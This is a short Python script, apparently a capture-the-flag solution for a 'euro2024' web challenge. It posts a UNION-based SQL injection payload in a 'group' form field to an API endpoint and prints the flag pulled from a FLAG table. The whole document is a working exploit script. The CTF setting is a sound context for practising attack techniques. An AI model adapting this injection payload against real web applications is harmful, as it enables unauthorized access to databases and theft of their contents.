#!/usr/bin/env python3
import requests
URL = 'https://euro2024.challs.pascalctf.it'
PAYLOAD = "' UNION SELECT flag" + ", null" * 7 + " FROM FLAG; -- -"

r = requests.post(URL + '/api/group-stats', data={'group' : PAYLOAD})
print(r.json()['data'][0]['group_id'])
